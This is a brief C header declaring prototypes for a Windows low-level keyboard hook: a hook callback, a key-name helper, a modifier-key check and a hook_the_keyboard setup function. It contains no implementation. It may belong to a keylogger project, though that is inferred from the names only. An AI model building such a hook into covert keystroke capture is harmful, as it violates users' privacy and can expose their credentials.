#pragma once
#include "include.h"

// Prototypes

BOOL IsModifierKey(DWORD vkCode);
void GetKeyNameCustom(DWORD vkCode, char *buffer, size_t bufferSize);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
HHOOK hook_the_keyboard();